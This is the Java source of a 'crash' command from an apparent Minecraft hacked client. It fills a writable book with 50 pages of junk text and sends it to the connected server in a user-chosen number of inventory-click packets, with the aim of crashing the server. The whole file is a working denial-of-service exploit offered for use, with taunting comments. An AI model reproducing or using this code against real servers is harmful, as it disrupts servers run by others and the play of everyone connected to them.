package we.devs.forever.client.command.impl.commands;
/*
 * @author Crystallinqq on 5/19/2020
 */

import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.CPacketClickWindow;
import we.devs.forever.api.util.Util;
import we.devs.forever.client.command.api.Command;

public
class CrashCommand extends Command {
    int packets;

    public CrashCommand() {
        super("crash");
    }

    //this freezes me rn i think so like dont use it haha. ohare or someone plz fix  :D
    @Override
    public void execute(String[] commands) {
        new Thread("crash time trololol") {
            @Override
            public void run() {
                if (Minecraft.getMinecraft().

                        getCurrentServerData() == null || Minecraft.getMinecraft().

                        getCurrentServerData().serverIP.isEmpty()) {
                    Command.sendMessage("Join a server monkey");
                    return;
                }
                //if theres no argument tell user to pass an argument to the command
                if (commands[0] == null) {
                    Command.sendMessage("Put the number of packets to send as an argument to this command. (20 should be good)");
                    return;
                }

                //gets first argument in the command and tries to parse it as a integer
                try {
                    packets = Integer.parseInt(commands[0]);
                } catch (
                        NumberFormatException e) {
                    Command.sendMessage("Are you sure you put a number?");
                    return;
                }

                //do da crash itself.
                ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
                NBTTagList list = new NBTTagList();
                NBTTagCompound tag = new NBTTagCompound();
                String size;
                int pages = Math.min(50, 100);
                size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                for (
                        int i = 0;
                        i < pages; i++) {
                    String siteContent = size;
                    NBTTagString tString = new NBTTagString(siteContent);
                    list.appendTag(tString);
                }
                tag.setString("author", Util.mc.player.getName());
                tag.setString("title", "client > all :^D");
                tag.setTag("pages", list);
                bookObj.setTagInfo("pages", list);
                bookObj.setTagCompound(tag);
                //send BIIIIIIIGGG packetzzzz 2 crash :scream: >:DDDD
                for (
                        int i = 0;
                        i < packets; i++) {
                    Util.mc.playerController.connection.sendPacket(new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, (short) 0));
                }
            }
        }.start();
    }
}
